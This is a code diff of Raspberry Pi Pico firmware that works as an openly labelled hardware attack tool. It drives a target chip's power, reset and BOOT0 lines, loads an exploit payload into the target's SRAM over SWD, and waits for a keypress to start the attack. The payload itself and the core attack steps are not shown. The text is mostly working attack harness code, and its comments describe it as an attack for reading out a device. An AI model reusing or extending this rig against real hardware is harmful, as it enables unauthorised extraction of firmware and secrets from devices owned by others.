@@ -26,12 +26,18 @@
  *
  */
 
-#include <stdio.h>
-#include <pico/stdlib.h>
 #include <hardware/uart.h>
 #include <hardware/pwm.h>
+#include <hardware/watchdog.h>
+#include <pico/bootrom.h>
+#include <pico/stdlib.h>
+#include <stdio.h>
+#include <tusb.h>
 
-int bmp_loader(void);
+#include "config.h"
+#include "payload.h"
+
+int bmp_loader(const char *data, uint32_t length, uint32_t offset);
 
 // Exact steps for attack:
 //  Power pins high
@@ -52,52 +58,69 @@ int bmp_loader(void);
 
 #define LED_PIN PICO_DEFAULT_LED_PIN
 
-#define UART_TX_PIN 0 	// PIN 1
-#define UART_RX_PIN 1 	// PIN 2
-// GND					// PIN 3
-#define POWER1_PIN 2	// PIN 4
-#define POWER2_PIN 3	// PIN 5
-#define RESET_PIN 4		// PIN 6
-#define BOOT0_PIN 5		// PIN 7
-// GND					// PIN 8
-#define POWER3_PIN 6	// PIN 9
+static void target_power(bool on)
+{
+	if (on) {
+		// gpio_put(POWER1_PIN, 1);
+		// gpio_put(POWER2_PIN, 1);
+		// gpio_put(POWER3_PIN, 1);
+		gpio_set_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
+	} else {
+		// gpio_put(POWER1_PIN, 0);
+		// gpio_put(POWER2_PIN, 0);
+		// gpio_put(POWER3_PIN, 0);
+		gpio_clr_mask(1 << POWER1_PIN | 1 << POWER2_PIN | 1 << POWER3_PIN);
+	}
+}
 
-#define UART_BAUD 256000
-#define UART_ID uart0
-#define DATA_BITS 8
-#define STOP_BITS 1
-#define PARITY UART_PARITY_NONE
-
-#define UART_STALLS_FOR_LED_OFF 10000
-
-const char DUMP_START_MAGIC[] = {0x10, 0xAD, 0xDA, 0x7A};
+static void handle_control(uint32_t timeout_ms)
+{
+	printf("Target not found... retrying\n");
+	int c = getchar_timeout_us(timeout_ms * 1000);
+	if (c == PICO_ERROR_TIMEOUT) {
+		return;
+	}
+	switch (c) {
+	case 'b':
+		printf("Bootloader mode selected\n");
+		reset_usb_boot(0, 0);
+		sleep_ms(10000);
+		break;
+	case 'r':
+		printf("Restarting Pico\n");
+		watchdog_reboot(0, 0, 10);
+		sleep_ms(10000);
+		break;
+	default:
+		printf("Usage:\n");
+		printf("    b    Reboot into bootloader mode\n");
+		printf("    r    Restart Pico\n");
+		printf("\n");
+		break;
+	}
+}
 
 int main()
 {
 	stdio_init_all();
-
-	// Prevent interpreting 0x0A as newline (0x0D 0x0A) instead of binary data
-	// This will spare you a headache when dealing with putchar()
-	stdio_set_translate_crlf(&stdio_usb, false);
-
-	// Init UART
-	uart_init(UART_ID, UART_BAUD);
-	gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
-	gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
-	uart_set_format(UART_ID, DATA_BITS, STOP_BITS, PARITY);
-	uart_set_fifo_enabled(UART_ID, true);
+	while (!tud_cdc_connected()) {
+	}
 
 	// Init GPIOs
 	gpio_init(LED_PIN);
+	gpio_init(SWDIO_PIN);
+	gpio_init(SWCLK_PIN);
 	gpio_init(POWER1_PIN);
 	gpio_init(POWER2_PIN);
 	gpio_init(POWER3_PIN);
 	gpio_init(RESET_PIN);
 	gpio_init(BOOT0_PIN);
 	gpio_set_dir(LED_PIN, GPIO_OUT);
-	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
+	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
+	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
 	gpio_set_dir(RESET_PIN, GPIO_IN);
 	gpio_pull_up(RESET_PIN);
+	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
 
 	// Init PWM for indicator LED
 	gpio_set_function(LED_PIN, GPIO_FUNC_PWM);
@@ -120,29 +143,34 @@ int main()
 	 * to prevent the target from sinking current through the pin if the debug
 	 * probe is already attached
 	 */
-	gpio_put(POWER1_PIN, 1);
-	gpio_put(POWER2_PIN, 1);
-	gpio_put(POWER3_PIN, 1);
+	target_power(1);
 	gpio_set_dir(POWER1_PIN, GPIO_OUT);
 	gpio_set_dir(POWER2_PIN, GPIO_OUT);
 	gpio_set_dir(POWER3_PIN, GPIO_OUT);
 
 	gpio_put(LED_PIN, 0);
 
-	while (gpio_get(RESET_PIN)) {
+	while (!gpio_get(RESET_PIN)) {
 		printf("Target is already in RESET! Ensure target is active before continuing.\r\n");
-		tight_loop_contents();
+		handle_control(500);
 	}
-
 
 	// -- Ensure that the target exploit firmware has been loaded into the target's SRAM before preceeding --
 
+	while (bmp_loader(payload, sizeof(payload), 0x20000000) != 0) {
+		handle_control(500);
+	}
+
+	printf("Connected to target\n");
+	sleep_ms(1000);
+
+	printf("Found target. Loading exploit...\n");
+
 	// Wait for any serial input to start the attack
 	int i = 0;
-	bmp_loader();
 	while (getchar_timeout_us(500 * 1000) == PICO_ERROR_TIMEOUT) {
 		printf("%d: Load firmware via JTAG. Press any key to start the attack...\r\n", i += 1);
-		tight_loop_contents();
+		handle_control(500);
 	}
 
 	printf("Starting attack...\r\n");
@@ -193,22 +221,24 @@ int main()
 	// Forward dumped data from UART to USB serial
 	uint stalls = 0;
 	while (true) {
-		int c;
-		if (uart_is_readable(UART_ID)) {
-			c = uart_getc(UART_ID);
-			putchar(c);
-			pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
-			stalls = 0;
-		} else {
-			// If no data is received for a while, turn off the LED
-			if (++stalls == UART_STALLS_FOR_LED_OFF)
-				pwm_set_gpio_level(LED_PIN, 0);
-		}
+		handle_control(500);
 
-		c = getchar_timeout_us(0);
-		if (c != PICO_ERROR_TIMEOUT) {
-			// putchar(c); // Echo back
-			uart_putc_raw(UART_ID, c);
-		}
+		// int c;
+		// if (uart_is_readable(UART_ID)) {
+		// 	c = uart_getc(UART_ID);
+		// 	putchar(c);
+		// 	pwm_set_gpio_level(LED_PIN, c); // LED will change intensity based on UART data
+		// 	stalls = 0;
+		// } else {
+		// 	// If no data is received for a while, turn off the LED
+		// 	if (++stalls == UART_STALLS_FOR_LED_OFF)
+		// 		pwm_set_gpio_level(LED_PIN, 0);
+		// }
+
+		// c = getchar_timeout_us(0);
+		// if (c != PICO_ERROR_TIMEOUT) {
+		// 	// putchar(c); // Echo back
+		// 	uart_putc_raw(UART_ID, c);
+		// }
 	}
 }
